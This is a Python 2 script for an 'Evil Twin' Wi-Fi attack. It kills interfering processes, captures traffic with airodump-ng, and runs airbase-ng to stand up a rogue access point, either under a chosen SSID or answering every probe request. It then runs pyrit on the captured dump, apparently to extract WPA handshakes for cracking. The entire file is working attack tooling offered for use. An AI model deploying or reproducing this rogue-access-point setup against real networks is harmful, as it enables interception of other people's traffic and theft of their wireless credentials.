#! /usr/bin/env python

import os
import glob
import time
from analyzr_core import *
from subprocess import Popen, PIPE

class EvilTwin():
    
    def __init__(self, core):
        print "Setting up Evil Twin"
        self._core = core
    
    def start(self):
        core.kill_processes()
        self._create_dump_dir()
        interface = self._select_interface()
        file_name = self._select_file_name()
        ssid = core.get_parsed_cli_options().ssid
        try:
            if(ssid == None or ssid == ""):
                print "No SSID specified, starting airbase-ng with -P switch enabled."
                self._start_p(interface, file_name)
            else:
                print "Starting airbase-ng with SSID ", ssid
                self._start(interface, file_name, ssid)
        except KeyboardInterrupt:
            print "Catched keyboard interrupt: Analyzing dump."
            self._analyze_dump()
            sys.exit()

    def _start_p(self, interface, file_name):
        Popen(["airodump-ng", interface, "-w", file_name],
                stdout=PIPE, stderr=open(os.devnull, "w"))
            
        Popen(["airbase-ng", "-Z", "4", "-P", "-F", file_name, interface]).communicate()            

    def _start(self, interface, file_name, ssid):
        Popen(["airbase-ng", "-Z", "4", "-F", file_name, "--essid", ssid, interface]).communicate()
    	
    def _select_interface(self):
        interface = core.get_parsed_cli_options().interface
        if(interface == None or interface == ""):
            interface = core.select_interface()
        return interface
    
    def _select_file_name(self):
        file_name = core.get_parsed_cli_options().filename
        if(file_name == None or file_name == ""):
            file_name = "dump"
        return file_name

    def _analyze_dump(self):
        files = glob.glob("*.cap")
        Popen(["pyrit", "-r", files[0], "analyze"]).communicate()
    
    def _create_dump_dir(self):
        dir_name = str(time.time())
        os.mkdir(dir_name)
        os.chdir(dir_name)

    def on_end(self):
        pass


core = AnalyzrCore()
core.get_arg_parser().add_argument("--ssid", dest="ssid", default=None,
                                      help="SSID of the evil twin")
evil_twin = EvilTwin(core)

evil_twin.start()